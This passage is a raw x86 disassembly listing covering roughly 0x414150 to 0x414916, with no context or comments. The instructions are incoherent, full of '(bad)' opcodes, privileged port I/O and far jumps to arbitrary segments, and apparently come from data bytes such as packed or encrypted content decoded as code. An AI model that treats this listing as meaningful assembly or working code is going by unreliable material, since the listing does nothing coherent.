  414150:	scas   eax,DWORD PTR es:[edi]
  414151:	cmp    edi,DWORD PTR [ebp+ecx*1+0x67]
  414155:	popf   
  414156:	stc    
  414157:	nop
  414158:	xor    bl,ah
  41415a:	push   esp
  41415b:	xor    al,0x71
  41415d:	cmp    BYTE PTR [ecx+0x130d8253],al
  414163:	fbstp  TBYTE PTR [ecx-0x10]
  414166:	lods   eax,DWORD PTR ds:[esi]
  414167:	dec    edi
  414168:	mov    ch,0x7b
  41416a:	pop    esi
  41416b:	inc    ecx
  41416c:	cdq    
  41416d:	pop    ds
  41416e:	idiv   DWORD PTR [edi+0x7d]
  414171:	mov    bh,0x1
  414173:	push   es
  414174:	outs   dx,DWORD PTR ds:[esi]
  414175:	adc    edx,esi
  414177:	fadd   DWORD PTR [eax-0x34fd94eb]
  41417d:	ret    
  41417e:	xor    BYTE PTR [ecx+eax*1+0x59935689],0x8f
  414186:	test   BYTE PTR [ebx+eiz*8+0x3f],dh
  41418a:	push   esp
  41418b:	inc    ecx
  41418c:	jno    0x414199
  41418e:	outs   dx,DWORD PTR cs:[esi]
  414190:	enter  0x18bd,0xca
  414194:	mov    eax,0x6d46a31f
  414199:	push   ds
  41419a:	adc    eax,0xd614a951
  41419f:	cmp    dl,BYTE PTR [ebx+0x50cd35a7]
  4141a5:	cmp    DWORD PTR [ebp+esi*2+0x6e],eax
  4141a9:	dec    edx
  4141aa:	pop    ds
  4141ab:	adc    DWORD PTR [ebx+0x13],edx
  4141ae:	popf   
  4141af:	jp     0x414222
  4141b1:	cmp    DWORD PTR [eax],eax
  4141b3:	bound  edi,QWORD PTR [ebp+0x6ccad6cc]
  4141b9:	and    BYTE PTR [esi+0x4d6b2d60],ch
  4141bf:	int    0x30
  4141c1:	adc    al,0xe9
  4141c3:	cdq    
  4141c4:	add    eax,0xcc2fe0ec
  4141c9:	lahf   
  4141ca:	scas   al,BYTE PTR es:[edi]
  4141cb:	adc    esi,DWORD PTR [ecx-0x538aeba4]
  4141d1:	mov    ah,0x95
  4141d3:	jl     0x4141a3
  4141d5:	inc    eax
  4141d6:	(bad)  
  4141d7:	retf   0xc88d
  4141da:	test   eax,0x6edb31cd
  4141df:	jle    0x4141e6
  4141e1:	adc    eax,DWORD PTR [ebx-0x2a039f50]
  4141e7:	in     al,0x84
  4141e9:	or     eax,DWORD PTR [edi]
  4141eb:	cs jne 0x4141a8
  4141ee:	aad    0xc0
  4141f0:	cmp    eax,0xb400c0de
  4141f5:	cld    
  4141f6:	add    dh,BYTE PTR [ebp-0x50]
  4141f9:	daa    
  4141fa:	dec    ebx
  4141fb:	jmp    0xe25d:0x1dad6a02
  414202:	xor    DWORD PTR [eax+edx*4],eax
  414205:	es adc edi,ebx
  414208:	pop    esi
  414209:	loopne 0x414200
  41420b:	lea    esi,[ecx*4+0x1781b42d]
  414212:	(bad)  
  414213:	out    0xb0,eax
  414215:	add    ch,0xeb
  414218:	wbinvd 
  41421a:	(bad)  
  41421b:	cld    
  41421c:	gs mov dl,0x7d
  41421f:	jg     0x4141d8
  414221:	or     DWORD PTR [esi*2+0x256af67a],0x8dd734d2
  41422c:	jno    0x4141bb
  41422e:	cmp    eax,0x41b8166b
  414233:	and    cl,BYTE PTR [ecx+eiz*1-0x8]
  414237:	mov    esi,0x89fe513
  41423c:	cmc    
  41423d:	sbb    eax,DWORD PTR [edi]
  41423f:	jge    0x4142b2
  414241:	xchg   edx,eax
  414242:	pushf  
  414243:	add    bh,ch
  414245:	jo     0x414259
  414247:	std    
  414248:	add    BYTE PTR [ecx],ah
  41424a:	xchg   esp,eax
  41424b:	icebp  
  41424c:	add    ch,BYTE PTR [ebp+0xe]
  41424f:	pop    esp
  414250:	pop    ecx
  414251:	cld    
  414252:	add    dh,bh
  414254:	jno    0x4142ce
  414256:	enter  0x23b9,0x8c
  41425a:	cmp    edi,esp
  41425c:	push   0x50
  41425e:	xor    DWORD PTR [esi],ebp
  414260:	rcr    DWORD PTR [edx+eiz*2+0x40],1
  414264:	jno    0x4142d4
  414266:	out    0xf9,eax
  414268:	in     eax,dx
  414269:	fld    TBYTE PTR [eax]
  41426b:	out    dx,eax
  41426c:	into   
  41426d:	xlat   BYTE PTR ds:[ebx]
  41426e:	out    dx,al
  41426f:	je     0x41429a
  414271:	sub    eax,0xea8419a4
  414276:	cmc    
  414277:	pusha  
  414278:	jg     0x414227
  41427a:	push   0x29
  41427c:	fwait
  41427d:	xor    eax,0xffffffea
  414280:	icebp  
  414281:	ret    0x71db
  414284:	les    ebx,FWORD PTR [ebp+0x45]
  414287:	das    
  414288:	icebp  
  414289:	cmp    al,0xde
  41428b:	sub    edi,DWORD PTR [esi]
  41428d:	push   0xb7157ab
  414292:	push   ebx
  414293:	mov    bl,0x9
  414295:	dec    esi
  414296:	xlat   BYTE PTR ds:[ebx]
  414297:	mov    eax,0x76cf458b
  41429c:	(bad)  ds:0xa9118a33
  4142a2:	adc    BYTE PTR [esp+ebp*1],cl
  4142a5:	pushf  
  4142a6:	aad    0x69
  4142a8:	mov    dh,0x7b
  4142aa:	dec    ecx
  4142ab:	pop    ebp
  4142ac:	cld    
  4142ad:	jb     0x41425a
  4142af:	repz leave 
  4142b1:	pop    ds
  4142b2:	mov    ds:0x2fd2d6fd,al
  4142b7:	dec    esi
  4142b8:	push   cs
  4142b9:	popf   
  4142ba:	aad    0xe2
  4142bc:	cmp    cl,cl
  4142be:	adc    BYTE PTR [ecx+ebp*8-0x16db0cc8],0x3d
  4142c6:	retf   0x1c3f
  4142c9:	pusha  
  4142ca:	(bad)  
  4142cb:	(bad)  
  4142cc:	push   eax
  4142cd:	out    0x24,al
  4142cf:	dec    esi
  4142d0:	jno    0x4142a7
  4142d2:	jmp    0x4142fa
  4142d4:	bswap  esp
  4142d6:	pop    ecx
  4142d7:	jle    0x4142da
  4142d9:	and    BYTE PTR [edx+ecx*1],cl
  4142dc:	and    al,0xb7
  4142de:	sbb    BYTE PTR [ebx],bl
  4142e0:	out    0xa5,al
  4142e2:	leave  
  4142e3:	sub    DWORD PTR [ecx-0x3a],esi
  4142e6:	dec    ecx
  4142e7:	push   cs
  4142e8:	scas   eax,DWORD PTR es:[edi]
  4142e9:	test   esp,edi
  4142eb:	push   es
  4142ec:	fistp  DWORD PTR [edi]
  4142ee:	dec    ebp
  4142ef:	jnp    0x41436a
  4142f1:	fucomi st,st(0)
  4142f3:	jle    0x4142b9
  4142f5:	push   ss
  4142f6:	mov    ?,WORD PTR [eax+ecx*4-0x5f]
  4142fa:	retf   0x87c1
  4142fd:	mov    bh,0xdc
  4142ff:	push   edx
  414300:	cld    
  414301:	sub    eax,0xb3e14acc
  414306:	int3   
  414307:	pusha  
  414308:	xchg   BYTE PTR [ebx],bh
  41430a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41430b:	mov    esp,0x88f31fdc
  414310:	or     cl,BYTE PTR [ecx+0x68342495]
  414316:	sbb    eax,0x2d07d6d9
  41431b:	sbb    al,ch
  41431d:	pop    ds
  41431e:	jmp    0x414355
  414320:	mov    ds:0x868858d5,eax
  414325:	sub    ebp,edx
  414327:	stos   BYTE PTR es:[edi],al
  414328:	pop    ss
  414329:	in     eax,dx
  41432a:	stc    
  41432b:	push   ss
  41432c:	loope  0x414394
  41432e:	mov    eax,ds:0xfc0c477e
  414333:	mov    ch,0x71
  414335:	or     al,0xa0
  414337:	sub    DWORD PTR [eax+0x6],esi
  41433a:	(bad)  
  41433b:	adc    edx,esp
  41433d:	rol    BYTE PTR [esp+ebp*2-0x5d],cl
  414341:	fbld   TBYTE PTR [esi]
  414343:	sub    DWORD PTR [edx-0x5d],0xffffffe0
  414347:	cmc    
  414348:	xor    DWORD PTR [eax-0x1c],edx
  41434b:	xor    esp,DWORD PTR [edi-0x4ee92759]
  414351:	hlt    
  414352:	in     eax,dx
  414353:	jmp    0x512a:0xd09b1f96
  41435a:	out    dx,al
  41435b:	dec    esi
  41435c:	test   ebx,edi
  41435e:	(bad)  
  41435f:	loope  0x4142e3
  414361:	vmread ecx,ecx
  414364:	fidiv  WORD PTR [di-0x12aa]
  414369:	pop    eax
  41436a:	push   0x9d1878a0
  41436f:	das    
  414370:	xor    eax,0xa8b522d0
  414375:	retf   
  414376:	aad    0xdd
  414378:	dec    esp
  414379:	stos   DWORD PTR es:[edi],eax
  41437a:	push   edi
  41437b:	xchg   BYTE PTR gs:[ebp-0x53],ah
  41437f:	jne    0x4143e1
  414381:	or     esi,DWORD PTR [ecx-0x47]
  414384:	sti    
  414385:	shl    DWORD PTR ss:[ecx],0x71
  414389:	loope  0x4143d9
  41438b:	rcl    DWORD PTR [eax-0x5027f4ae],1
  414391:	sbb    al,0xb6
  414393:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414394:	mov    dl,0x2d
  414396:	je     0x41433f
  414398:	sbb    BYTE PTR [edi-0x212e881c],0x3a
  41439f:	data16 sbb BYTE PTR [ebp+0x2d],bh
  4143a3:	xor    ah,BYTE PTR ds:[eax]
  4143a6:	push   esp
  4143a7:	loopne 0x414428
  4143a9:	mov    bh,0x6f
  4143ab:	out    dx,eax
  4143ac:	cmp    al,0x20
  4143ae:	dec    esi
  4143af:	inc    ebx
  4143b0:	pop    es
  4143b1:	adc    edx,DWORD PTR [edi-0x4a]
  4143b4:	pop    ebx
  4143b5:	fmul   QWORD PTR [bp+di+0x102f]
  4143ba:	cmp    al,0x2c
  4143bc:	icebp  
  4143bd:	push   ds
  4143be:	hlt    
  4143bf:	push   edx
  4143c0:	push   0x20
  4143c2:	arpl   WORD PTR [edx+0x63],dx
  4143c5:	mov    dl,0x56
  4143c7:	mov    bl,0x32
  4143c9:	pusha  
  4143ca:	aad    0xac
  4143cc:	dec    ebx
  4143cd:	dec    esp
  4143ce:	dec    DWORD PTR [edi+0x1]
  4143d1:	lea    eax,[edx]
  4143d3:	js     0x4143b4
  4143d5:	inc    edi
  4143d6:	imul   ebx,DWORD PTR [edx],0xffffffc9
  4143d9:	test   DWORD PTR [ebp-0x26f6505a],ebp
  4143df:	(bad)  
  4143e0:	jo     0x41445c
  4143e2:	mov    al,0x32
  4143e4:	mov    edi,0xaa617cc7
  4143e9:	and    cl,al
  4143eb:	mov    ds:0xc4141f5,al
  4143f0:	sub    DWORD PTR [esi-0x1f8edac1],ecx
  4143f6:	dec    ebp
  4143f7:	lods   eax,DWORD PTR ds:[esi]
  4143f8:	dec    esi
  4143f9:	inc    edi
  4143fa:	mov    bl,dh
  4143fc:	push   ebx
  4143fd:	and    BYTE PTR [eax],cl
  4143ff:	les    esi,FWORD PTR [esi]
  414401:	dec    esp
  414402:	test   al,0xfe
  414404:	dec    eax
  414405:	adc    dh,0x52
  414408:	iret   
  414409:	sar    ebx,cl
  41440b:	dec    edx
  41440c:	jle    0x414407
  41440e:	mov    ecx,0xc6203d32
  414413:	or     BYTE PTR [ebx+0x6e],bh
  414416:	jmp    0x1249c03a
  41441b:	sbb    eax,0xaebaa6c3
  414420:	addr16 mov dl,0x5
  414423:	fcmovnb st,st(4)
  414425:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414426:	xchg   DWORD PTR [ebx+0x2c],esp
  414429:	and    BYTE PTR [ebx+0x3],dl
  41442c:	sub    bl,dh
  41442e:	mov    DWORD PTR [eax+edi*8+0x7],edx
  414432:	(bad)  
  414433:	ja     0x4143c3
  414435:	or     cl,cl
  414437:	jg     0x414488
  414439:	(bad)  
  41443a:	mov    ecx,0x1d72d975
  41443f:	xchg   edi,eax
  414440:	cdq    
  414441:	sti    
  414442:	loope  0x414456
  414444:	jb     0x4144c3
  414446:	or     al,0x42
  414448:	aas    
  414449:	mov    eax,ds:0xb23917f1
  41444e:	scas   al,BYTE PTR es:[edi]
  41444f:	jne    0x41440b
  414451:	mov    dl,0xe7
  414453:	mov    edx,0xcbb52770
  414458:	lods   al,BYTE PTR ds:[esi]
  414459:	stos   DWORD PTR es:[edi],eax
  41445a:	fs jbe 0x4144dc
  41445d:	mov    cs,WORD PTR [ebx-0x8]
  414460:	pop    edx
  414461:	push   0x1feeba9d
  414466:	mov    ds:0x2c11cf17,eax
  41446b:	adc    BYTE PTR [edi-0x23c02a1a],bl
  414471:	cmp    al,0x1e
  414473:	sahf   
  414474:	push   edi
  414475:	xor    DWORD PTR [ecx-0x19],eax
  414478:	jmp    0x414499
  41447a:	sbb    ch,BYTE PTR [eax-0x1d38f735]
  414480:	jo     0x41443d
  414482:	aad    0x22
  414484:	int3   
  414485:	out    0xff,eax
  414487:	(bad)  
  414488:	in     al,0xe4
  41448a:	test   eax,0x4f1fd6ec
  41448f:	fnstcw WORD PTR [eax+0x5ffd1090]
  414495:	lahf   
  414496:	jne    0x4144ba
  414498:	into   
  414499:	xlat   BYTE PTR ds:[ebx]
  41449a:	aad    0xcd
  41449c:	jg     0x414478
  41449e:	mov    cs,WORD PTR [esi+0x2f]
  4144a1:	jle    0x4144ab
  4144a3:	push   ebp
  4144a4:	pop    ecx
  4144a5:	and    BYTE PTR [eax+esi*8],ah
  4144a8:	stc    
  4144a9:	jp     0x41452a
  4144ab:	mov    bl,0xc6
  4144ad:	in     al,0xd5
  4144af:	pop    es
  4144b0:	push   edx
  4144b1:	mov    WORD PTR [ebx+0x73b77b6c],?
  4144b7:	jne    0x414465
  4144b9:	xor    eax,0x427c525e
  4144be:	push   ecx
  4144bf:	shl    DWORD PTR [ebx+eiz*1-0x48],cl
  4144c3:	xchg   esi,eax
  4144c4:	stc    
  4144c5:	aam    0x4f
  4144c7:	xor    eax,0xacf053f6
  4144cc:	popf   
  4144cd:	pop    esp
  4144ce:	aam    0x79
  4144d0:	lock or al,0xe
  4144d3:	lea    edx,[ebx-0x20]
  4144d6:	ins    BYTE PTR es:[edi],dx
  4144d7:	(bad)  
  4144d8:	(bad)  
  4144d9:	mov    dl,0xd5
  4144db:	inc    esi
  4144dc:	into   
  4144dd:	in     al,dx
  4144de:	and    ebx,DWORD PTR [edi]
  4144e0:	lods   al,BYTE PTR ds:[esi]
  4144e1:	inc    edi
  4144e2:	clc    
  4144e3:	fs ss sub al,0x40
  4144e7:	mov    ebp,0x81e34aa0
  4144ec:	jno    0x414471
  4144ee:	dec    ecx
  4144ef:	jnp    0x414509
  4144f1:	fst    st(6)
  4144f3:	(bad)  
  4144f4:	mov    ds:0x952e1920,al
  4144f9:	dec    edi
  4144fa:	(bad)  
  4144fb:	mov    bh,0x59
  4144fd:	call   DWORD PTR [ebp-0x23226e88]
  414503:	jmp    0x4341:0x1bbc9c01
  41450a:	dec    esi
  41450b:	cmc    
  41450c:	call   0x218c2330
  414511:	fcomp  QWORD PTR [ecx-0x29fec83b]
  414517:	add    al,0xfa
  414519:	mov    eax,0x41c44df0
  41451e:	mov    bh,0xe6
  414520:	rcr    BYTE PTR [edi],0x8f
  414523:	pop    ecx
  414524:	xchg   esp,eax
  414525:	es in  eax,0x8
  414528:	push   ss
  414529:	test   ch,dl
  41452b:	ss mov dl,0x65
  41452e:	jbe    0x414550
  414530:	sbb    edi,edi
  414532:	inc    ecx
  414533:	jne    0x41454a
  414535:	mov    ds:0xd67d6e59,eax
  41453a:	sbb    dl,dh
  41453c:	add    DWORD PTR [esi-0xe],edx
  41453f:	int3   
  414540:	mov    esi,0xe366959d
  414545:	push   esp
  414546:	adc    eax,0xd01fedca
  41454b:	fdivr  st(0),st
  41454d:	push   ds
  41454e:	mov    cl,0x3e
  414550:	aas    
  414551:	mov    dl,0xf4
  414553:	retf   0x9ca9
  414556:	and    edi,DWORD PTR [ebp+ebx*1+0x0]
  41455a:	add    cl,BYTE PTR [ebp+esi*1-0x437f5f46]
  414561:	scas   eax,DWORD PTR es:[edi]
  414562:	dec    ecx
  414563:	cdq    
  414564:	icebp  
  414565:	sar    DWORD PTR [ebx],cl
  414567:	arpl   WORD PTR [edx+0x43],dx
  41456a:	(bad)  
  41456b:	xor    edx,esp
  41456d:	ins    BYTE PTR es:[edi],dx
  41456e:	in     eax,0xb0
  414570:	icebp  
  414571:	aad    0xc1
  414573:	cmp    DWORD PTR [eax+0x23],ecx
  414576:	xor    bh,0x3
  414579:	add    al,0x9
  41457b:	jns    0x41456e
  41457d:	dec    bh
  41457f:	xor    eax,0xe761ec71
  414584:	mov    ch,0x8f
  414586:	mov    al,0x9d
  414588:	sti    
  414589:	pop    ds
  41458a:	inc    eax
  41458b:	xchg   esi,eax
  41458c:	int    0xb2
  41458e:	jl     0x4145b4
  414590:	jle    0x4145bc
  414592:	mov    edi,0xee3e7f3e
  414597:	nop
  414598:	mov    ds:0x687ac43f,eax
  41459d:	lods   al,BYTE PTR ds:[esi]
  41459e:	xor    eax,0x6e268e75
  4145a3:	adc    BYTE PTR [ebx],al
  4145a5:	(bad)  
  4145a6:	into   
  4145a7:	push   edx
  4145a8:	popf   
  4145a9:	push   es
  4145aa:	xchg   ebp,eax
  4145ab:	je     0x41461e
  4145ad:	cmp    ebp,edx
  4145af:	add    DWORD PTR [esi],ecx
  4145b1:	push   0x59
  4145b3:	pop    ecx
  4145b4:	add    al,0x20
  4145b6:	jns    0x41453f
  4145b8:	fcomip st,st(5)
  4145ba:	inc    DWORD PTR [eax+0x4b]
  4145bd:	inc    edx
  4145be:	aad    0x9d
  4145c0:	mov    esi,0x227d2b7a
  4145c5:	iret   
  4145c6:	fdiv   QWORD PTR [ecx+ecx*8+0x72]
  4145ca:	inc    esi
  4145cb:	pop    ebx
  4145cc:	scas   al,BYTE PTR es:[edi]
  4145cd:	xor    al,0x7
  4145cf:	les    esi,FWORD PTR [ecx+0x57]
  4145d2:	fwait
  4145d3:	mov    bh,0xe4
  4145d5:	inc    BYTE PTR [esp+ebx*4]
  4145d8:	dec    edx
  4145d9:	and    bh,al
  4145db:	and    bh,BYTE PTR [edx+0x6aaeafba]
  4145e1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4145e2:	fdiv   QWORD PTR [edx+ebx*1]
  4145e5:	ja     0x4145f8
  4145e7:	sbb    eax,DWORD PTR [ecx]
  4145e9:	sub    esi,ebp
  4145eb:	xchg   edi,eax
  4145ec:	das    
  4145ed:	pop    edi
  4145ee:	imul   ebx,esi,0xf00259f2
  4145f4:	(bad)  
  4145f6:	ins    BYTE PTR es:[edi],dx
  4145f7:	xor    eax,0xf6d880a7
  4145fc:	bound  ecx,QWORD PTR [edx-0x4f0359d5]
  414602:	add    BYTE PTR [edi-0x62815fa3],ch
  414608:	popf   
  414609:	std    
  41460a:	scas   eax,DWORD PTR es:[edi]
  41460b:	sub    edi,0xffffff8e
  41460e:	mov    fs,ecx
  414610:	adc    DWORD PTR [ebp+ebx*2+0x3a],esi
  414614:	les    edx,FWORD PTR [esi-0x3d4fcd17]
  41461a:	mov    dl,0x75
  41461c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41461d:	mov    eax,0xf59d3c8c
  414622:	sub    al,0x15
  414624:	mul    BYTE PTR [edi+0x615082dc]
  41462a:	push   ebx
  41462b:	sbb    BYTE PTR [ecx-0xc],dh
  41462e:	fstp   DWORD PTR [esi+0x3d60027]
  414634:	push   edx
  414635:	jmp    0xc50a:0x84787ef1
  41463c:	iret   
  41463d:	out    0x73,eax
  41463f:	mov    cl,0x8b
  414641:	xchg   esi,eax
  414642:	push   ebp
  414643:	into   
  414644:	popa   
  414645:	outs   dx,DWORD PTR ds:[esi]
  414646:	pop    ebp
  414647:	sahf   
  414648:	and    DWORD PTR [esi-0x24],0xffffffe6
  41464c:	inc    edi
  41464d:	adc    DWORD PTR [edi],ecx
  41464f:	inc    ebp
  414650:	rol    esp,0x19
  414653:	cmp    cl,BYTE PTR [edx]
  414655:	and    BYTE PTR [edx-0x45e60b60],cl
  41465b:	jo     0x414638
  41465d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41465e:	aad    0xc8
  414660:	lods   al,BYTE PTR ds:[esi]
  414661:	or     cl,bh
  414663:	push   0x757d3fc1
  414668:	sahf   
  414669:	push   esi
  41466a:	int    0x81
  41466c:	cmp    DWORD PTR ds:0xe070e88c,0xbf72e970
  414676:	mov    esi,0xf7d04d95
  41467b:	xor    al,0x51
  41467d:	dec    ecx
  41467e:	fs js  0x414686
  414681:	popf   
  414682:	std    
  414683:	imul   edi,DWORD PTR [eax],0xf8a3b5a2
  414689:	ins    DWORD PTR es:[edi],dx
  41468a:	aad    0x99
  41468c:	cwde   
  41468d:	mov    edx,0x6330482a
  414692:	xor    BYTE PTR [ebp+0x7a],0xe2
  414696:	pushf  
  414697:	pop    edx
  414698:	and    BYTE PTR [edi+0x2d],ch
  41469b:	pop    eax
  41469c:	jno    0x4146be
  41469e:	sar    ebx,0x84
  4146a1:	jno    0x414686
  4146a3:	push   ebx
  4146a4:	jae    0x41470d
  4146a6:	in     al,0xfd
  4146a8:	je     0x414690
  4146aa:	sbb    edi,DWORD PTR [edx]
  4146ac:	and    ebx,esp
  4146ae:	(bad)  
  4146af:	lock sub ecx,DWORD PTR [ebp+0x25]
  4146b3:	jae    0x4146ee
  4146b5:	dec    ebx
  4146b6:	aad    0x4a
  4146b8:	inc    ecx
  4146b9:	jle    0x414672
  4146bb:	iret   
  4146bc:	jecxz  0x4146c1
  4146be:	xor    BYTE PTR [esi+0x1d],0xaf
  4146c2:	cmp    al,0xe1
  4146c4:	mov    ds:0x76d63ad7,al
  4146c9:	dec    esi
  4146ca:	(bad)  
  4146cb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4146cc:	cmp    eax,0x9a7544c1
  4146d1:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4146d3:	aad    0xd8
  4146d5:	jne    0x414722
  4146d7:	sub    ch,ah
  4146d9:	fidivr DWORD PTR [ecx-0x1bb48732]
  4146df:	sub    edi,DWORD PTR [edi+edx*4-0x6b]
  4146e3:	mov    ch,0xe8
  4146e5:	in     eax,0x36
  4146e7:	mov    eax,ds:0x7c1274d7
  4146ec:	lods   al,BYTE PTR ds:[esi]
  4146ed:	mov    bh,0x6a
  4146ef:	jne    0x41476e
  4146f1:	ror    BYTE PTR [esi+0x45],cl
  4146f4:	jae    0x41467e
  4146f6:	push   edi
  4146f7:	mov    edi,0x35a8a7cd
  4146fc:	or     DWORD PTR [edi],edx
  4146fe:	add    dh,al
  414700:	or     BYTE PTR [eax+0x18],cl
  414703:	ins    DWORD PTR es:[edi],dx
  414704:	and    BYTE PTR gs:[ebx],bh
  414707:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414708:	mov    ecx,0x40d04406
  41470d:	push   edx
  41470e:	aad    0x27
  414710:	add    cl,BYTE PTR [edi-0x1a6257d5]
  414716:	fisubr WORD PTR [esi-0x73]
  414719:	xor    ebp,DWORD PTR [esi]
  41471b:	retf   0xe63a
  41471e:	aad    0x98
  414720:	test   BYTE PTR [ecx-0x6e5426ae],dh
  414726:	aad    0xba
  414728:	sahf   
  414729:	test   eax,0xcfef848b
  41472e:	xor    eax,0x2f47f775
  414733:	mov    edx,0xdbea45c2
  414738:	jno    0x4147b7
  41473a:	sub    al,0x50
  41473c:	test   al,0xd3
  41473e:	outs   dx,BYTE PTR ds:[esi]
  41473f:	mov    ds:0x521b2002,al
  414744:	pop    es
  414745:	out    dx,eax
  414746:	daa    
  414747:	jmp    FWORD PTR ds:0xc190d57f
  41474d:	jmp    0x4146f6
  41474f:	mov    bh,0xb1
  414751:	rcl    DWORD PTR [ebx+0x75],1
  414754:	arpl   WORD PTR [edi-0x1ea73d4b],cx
  41475a:	clc    
  41475b:	and    DWORD PTR [ecx],esp
  41475d:	gs aad 0x90
  414760:	out    dx,al
  414761:	stos   DWORD PTR es:[edi],eax
  414762:	test   al,0x3a
  414764:	loope  0x41475d
  414766:	push   es
  414767:	xchg   ecx,eax
  414768:	push   edi
  414769:	pop    ds
  41476a:	int    0xf5
  41476c:	jle    0x4146ef
  41476e:	imul   ebp,DWORD PTR [si],0x5d78d5fd
  414775:	shl    cl,cl
  414777:	sbb    bh,BYTE PTR [ebx]
  414779:	mov    ch,0xa1
  41477b:	js     0x4147bc
  41477d:	inc    ecx
  41477e:	jge    0x41473d
  414780:	enter  0x9e0c,0xb5
  414784:	je     0x41471e
  414786:	aad    0x50
  414788:	mov    WORD PTR [ecx-0x5a96bd54],cs
  41478e:	pushf  
  41478f:	jne    0x41479e
  414791:	in     al,0xa
  414793:	adc    al,0x3b
  414795:	pop    edi
  414796:	mov    eax,0xb4f71a1
  41479b:	add    ecx,eax
  41479d:	sti    
  41479e:	out    dx,eax
  41479f:	adc    al,BYTE PTR [ebp+0x20]
  4147a2:	adc    ah,bh
  4147a4:	stc    
  4147a5:	xor    BYTE PTR [ebp+eiz*2+0x22],0xbb
  4147aa:	fcomp  DWORD PTR [eax+0x2dc30304]
  4147b0:	out    0xd0,eax
  4147b2:	sbb    eax,0x355d6ecd
  4147b7:	xchg   edi,eax
  4147b8:	adc    bl,BYTE PTR [edx]
  4147ba:	dec    eax
  4147bb:	jle    0x4147fa
  4147bd:	mov    ah,0xdf
  4147bf:	push   eax
  4147c0:	outs   dx,DWORD PTR ds:[esi]
  4147c1:	iret   
  4147c2:	aad    0x9c
  4147c4:	out    dx,al
  4147c5:	out    dx,eax
  4147c6:	jecxz  0x4147d6
  4147c8:	sub    esp,DWORD PTR [eax]
  4147ca:	adc    BYTE PTR [esi],dh
  4147cc:	mov    fs,WORD PTR [ecx]
  4147ce:	sar    BYTE PTR [edi-0x3f],1
  4147d1:	(bad)  
  4147d2:	aad    0x88
  4147d4:	push   esi
  4147d5:	sbb    al,0x34
  4147d7:	xchg   ecx,eax
  4147d8:	call   0xf2d7:0xfe78a5bb
  4147df:	rcl    DWORD PTR ds:0x5576b5dd,0x8a
  4147e6:	aad    0x6c
  4147e8:	cmp    bl,BYTE PTR [edx-0x19]
  4147eb:	pop    ebx
  4147ec:	es inc esp
  4147ee:	test   eax,0xeb9c0276
  4147f3:	mov    esi,0x5502d78a
  4147f8:	in     al,0xc6
  4147fa:	(bad)  
  4147fb:	mov    eax,0x176efa34
  414800:	and    al,0x38
  414802:	inc    ebp
  414803:	mov    eax,ds:0xc4936ff
  414808:	jne    0x414846
  41480a:	mov    ?,WORD PTR ds:0xbf66b44f
  414810:	std    
  414811:	xchg   esp,ebx
  414813:	test   DWORD PTR [ebp+0x61c87715],edx
  414819:	mov    ebx,0x205a1723
  41481e:	(bad)  [edi-0x19]
  414821:	cmp    DWORD PTR [ebx-0x238122a1],edx
  414827:	push   edi
  414828:	mov    DWORD PTR [edx-0x1ded524],ecx
  41482e:	fadd   st,st(5)
  414830:	dec    esp
  414831:	and    BYTE PTR [ebp-0x549e2c4],bh
  414837:	mov    al,0x9f
  414839:	lahf   
  41483a:	aad    0x5a
  41483c:	inc    eax
  41483d:	arpl   WORD PTR [ebx],sp
  41483f:	(bad)  
  414840:	mov    dh,0x7b
  414842:	jne    0x414899
  414844:	out    0x1f,eax
  414846:	leave  
  414847:	aam    0x10
  414849:	scas   al,BYTE PTR es:[edi]
  41484a:	push   0x2f
  41484c:	and    al,ah
  41484e:	aad    0x1
  414850:	ror    DWORD PTR [edx+0x6],1
  414853:	jmp    0x9a5:0x7547220b
  41485a:	(bad)  
  41485b:	mov    ds:0x4060884e,eax
  414860:	and    DWORD PTR [esi],edx
  414862:	fisub  DWORD PTR [esi+0x40]
  414865:	add    eax,0x35f10c5a
  41486a:	cmp    ah,dh
  41486c:	sbb    ah,BYTE PTR [eax]
  41486e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41486f:	rcr    BYTE PTR [esi+0x31],1
  414872:	mov    ecx,0xdaa61d8c
  414877:	jb     0x4148f4
  414879:	sub    eax,0x51f1f2cf
  41487e:	push   ebp
  41487f:	adc    dl,BYTE PTR [esi+0x20]
  414882:	push   0xbcee40a1
  414887:	mov    ebp,0x5b21bbdf
  41488c:	dec    ebx
  41488d:	cmp    eax,0xc0b1e8c8
  414892:	mov    bh,0x3b
  414894:	push   ebp
  414895:	cmp    al,0x15
  414897:	jne    0x4148d3
  414899:	xor    dh,BYTE PTR [ebx-0x7c]
  41489c:	jne    0x41491b
  41489e:	sub    esi,ebx
  4148a0:	jno    0x414903
  4148a2:	xor    DWORD PTR [eax-0xa35a223],esi
  4148a8:	fwait
  4148a9:	pop    ds
  4148aa:	icebp  
  4148ab:	mov    al,0x2b
  4148ad:	retf   
  4148ae:	ss cs dec ecx
  4148b1:	std    
  4148b2:	aad    0xe
  4148b4:	jmp    0x4121:0x435853f
  4148bb:	jne    0x414848
  4148bd:	or     DWORD PTR [ebx],ebx
  4148bf:	adc    eax,0xef462828
  4148c4:	js     0x41486e
  4148c6:	sbb    DWORD PTR [ecx-0x61],0x53
  4148ca:	xor    eax,0x4e773a25
  4148cf:	jne    0x414931
  4148d1:	mov    edx,0xe4ae0894
  4148d6:	xor    BYTE PTR [edi+0x71],ah
  4148d9:	jae    0x41491f
  4148db:	loopne 0x41485e
  4148dd:	gs and eax,ebp
  4148e0:	xchg   DWORD PTR [edi],ebx
  4148e2:	clc    
  4148e3:	jbe    0x414938
  4148e5:	pop    eax
  4148e6:	daa    
  4148e7:	cmc    
  4148e8:	mov    al,ds:0x4f02d617
  4148ed:	pop    ebx
  4148ee:	lahf   
  4148ef:	or     eax,0x78d30a04
  4148f4:	mov    ds:0xee5b478e,eax
  4148f9:	and    BYTE PTR [edx+ebp*2-0x4e69f286],bh
  414900:	xor    BYTE PTR [ecx-0x7d08a84],dh
  414906:	mov    edi,0x58f94716
  41490b:	inc    edx
  41490c:	jno    0x41498b
  41490e:	mov    ebx,0xb7279087
  414913:	push   ebp
  414914:	pop    esp
  414915:	das    
  414916:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
